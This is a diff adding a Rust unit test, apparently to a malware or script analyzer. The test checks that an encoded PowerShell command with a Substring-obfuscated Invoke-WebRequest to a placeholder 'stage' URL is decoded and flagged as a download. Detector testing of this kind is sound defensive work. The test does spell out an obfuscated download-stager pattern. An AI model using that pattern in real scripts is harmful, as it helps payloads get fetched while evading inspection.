@@ -10388,6 +10388,30 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_double_quoted_substring_literal_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ("xxhttps://ps-substring-dq.example/stageyy".Substring(2, 37))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-substring-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell double-quoted literal Substring URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps1_base64_string_decoded() {
         use base64::Engine;
         // After expanding [System.Convert]::FromBase64String('...') → 'http://b64.example/z'
